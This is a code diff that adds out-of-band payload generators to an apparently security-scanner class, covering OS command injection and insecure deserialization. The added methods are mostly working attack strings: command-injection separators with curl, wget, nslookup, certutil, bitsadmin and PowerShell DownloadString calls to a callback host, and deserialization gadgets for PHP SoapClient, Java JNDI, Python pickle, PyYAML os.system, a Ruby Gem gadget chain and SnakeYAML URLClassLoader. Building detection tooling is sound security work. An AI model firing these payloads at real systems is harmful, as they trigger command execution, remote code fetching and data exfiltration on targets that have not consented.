@@ -530,6 +530,174 @@ class OOBPayloadTemplates:
 <iframe src="{callback_url}/frame.html"></iframe>
 </body>
 </html>'''
+    
+    # =========================================================================
+    # OS Command Injection OOB Payloads
+    # =========================================================================
+    
+    @staticmethod
+    def cmdi_curl(callback_url: str, token: str = "") -> List[str]:
+        """Generate OS command injection payloads using curl"""
+        url = f"{callback_url}/{token}" if token else callback_url
+        return [
+            f"; curl {url}",
+            f"| curl {url}",
+            f"|| curl {url}",
+            f"&& curl {url}",
+            f"& curl {url}",
+            f"$(curl {url})",
+            f"`curl {url}`",
+            f"'; curl {url}; '",
+            f'"; curl {url}; "',
+            f"%0acurl {url}",
+            f"; curl -s {url}",
+            f"; curl --silent {url}",
+        ]
+    
+    @staticmethod
+    def cmdi_wget(callback_url: str, token: str = "") -> List[str]:
+        """Generate OS command injection payloads using wget"""
+        url = f"{callback_url}/{token}" if token else callback_url
+        return [
+            f"; wget {url}",
+            f"| wget {url}",
+            f"|| wget -q {url}",
+            f"&& wget --quiet {url}",
+            f"$(wget -q -O- {url})",
+            f"`wget -q {url}`",
+            f"'; wget {url}; '",
+        ]
+    
+    @staticmethod
+    def cmdi_nslookup(callback_host: str, token: str = "") -> List[str]:
+        """Generate OS command injection payloads using nslookup (DNS exfil)"""
+        hostname = f"{token}.{callback_host}" if token else callback_host
+        return [
+            f"; nslookup {hostname}",
+            f"| nslookup {hostname}",
+            f"|| nslookup {hostname}",
+            f"&& nslookup {hostname}",
+            f"$(nslookup {hostname})",
+            f"`nslookup {hostname}`",
+            f"; dig {hostname}",
+            f"| host {hostname}",
+            f"'; nslookup {hostname}; '",
+            # Windows
+            f"& nslookup {hostname}",
+            f"| nslookup {hostname}",
+        ]
+    
+    @staticmethod
+    def cmdi_ping(callback_host: str, token: str = "") -> List[str]:
+        """Generate OS command injection payloads using ping (useful for firewalled envs)"""
+        hostname = f"{token}.{callback_host}" if token else callback_host
+        return [
+            f"; ping -c1 {hostname}",
+            f"| ping -c1 {hostname}",
+            f"&& ping -c1 {hostname}",
+            f"$(ping -c1 {hostname})",
+            # Windows
+            f"& ping -n 1 {hostname}",
+        ]
+    
+    @staticmethod
+    def cmdi_certutil_windows(callback_url: str, token: str = "") -> List[str]:
+        """Generate Windows-specific command injection payloads"""
+        url = f"{callback_url}/{token}" if token else callback_url
+        return [
+            f"& certutil -urlcache -f {url} NUL",
+            f"| certutil -urlcache -f {url} NUL",
+            f"& powershell Invoke-WebRequest {url}",
+            f"| powershell (New-Object Net.WebClient).DownloadString('{url}')",
+            f"& bitsadmin /transfer j {url} %temp%\\t",
+        ]
+    
+    @staticmethod
+    def cmdi_all(callback_url: str, callback_host: str, token: str = "") -> List[str]:
+        """Generate all OS command injection OOB payloads"""
+        payloads = []
+        payloads.extend(OOBPayloadTemplates.cmdi_curl(callback_url, token))
+        payloads.extend(OOBPayloadTemplates.cmdi_wget(callback_url, token))
+        payloads.extend(OOBPayloadTemplates.cmdi_nslookup(callback_host, token))
+        payloads.extend(OOBPayloadTemplates.cmdi_certutil_windows(callback_url, token))
+        return payloads
+    
+    # =========================================================================
+    # Insecure Deserialization OOB Payloads
+    # =========================================================================
+    
+    @staticmethod
+    def deser_php_soap_client(callback_url: str) -> str:
+        """Generate PHP SoapClient SSRF gadget for deserialization"""
+        # This payload exploits the PHP SoapClient __call magic method
+        # When deserialized, it will make an HTTP request to the callback URL
+        return f'O:10:"SoapClient":3:{{s:3:"uri";s:1:"a";s:8:"location";s:{len(callback_url)}:"{callback_url}";s:13:"_soap_version";i:1;}}'
+    
+    @staticmethod
+    def deser_java_jndi(callback_host: str, token: str = "") -> List[str]:
+        """Generate Java JNDI/RMI/LDAP lookup URLs for deserialization"""
+        hostname = f"{token}.{callback_host}" if token else callback_host
+        return [
+            f"rmi://{hostname}/exploit",
+            f"ldap://{hostname}/exploit",
+            f"iiop://{hostname}/exploit",
+            f"dns://{hostname}",
+        ]
+    
+    @staticmethod
+    def deser_python_pickle(callback_url: str) -> str:
+        """
+        Generate Python pickle payload that calls urllib.
+        NOTE: This is a detection payload - actual exploitation may require ysoserial-net or custom gadgets.
+        """
+        import base64
+        # This is a simplified template - actual pickle RCE would need custom class
+        code = f'''
+import pickle
+import urllib.request
+class RCE:
+    def __reduce__(self):
+        return (urllib.request.urlopen, ("{callback_url}",))
+print(pickle.dumps(RCE()))
+'''
+        return f"# Python pickle RCE - generate with: {code}"
+    
+    @staticmethod
+    def deser_yaml_python(callback_url: str) -> List[str]:
+        """Generate YAML deserialization payloads for Python (PyYAML)"""
+        return [
+            f"!!python/object/apply:urllib.request.urlopen ['{callback_url}']",
+            f"!!python/object/apply:subprocess.check_output [['curl', '{callback_url}']]",
+            f"!!python/object/apply:os.system ['curl {callback_url}']",
+        ]
+    
+    @staticmethod
+    def deser_yaml_ruby(callback_url: str) -> str:
+        """Generate YAML deserialization payload for Ruby"""
+        return f'''--- !ruby/object:Gem::Installer
+i: x
+--- !ruby/object:Gem::SpecFetcher  
+i: y
+--- !ruby/object:Gem::Requirement
+requirements:
+  !ruby/object:Gem::Package::TarReader
+  io: &1 !ruby/object:Net::BufferedIO
+    io: &1 !ruby/object:Gem::Package::TarReader::Entry
+       read: 0
+       header: "abc"
+    debug_output: &1 !ruby/object:Net::WriteAdapter
+       socket: &1 !ruby/object:Gem::RequestSet
+           sets: !ruby/object:Net::WriteAdapter
+               socket: !ruby/module 'Kernel'
+               method_id: :system
+           git_set: "curl {callback_url}"
+       method_id: :resolve
+'''
+    
+    @staticmethod
+    def deser_snakeyaml_java(callback_url: str) -> str:
+        """Generate SnakeYAML deserialization payload for Java"""
+        return f'!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["{callback_url}"]]]]'
 
 
 # Integration helper for scanners
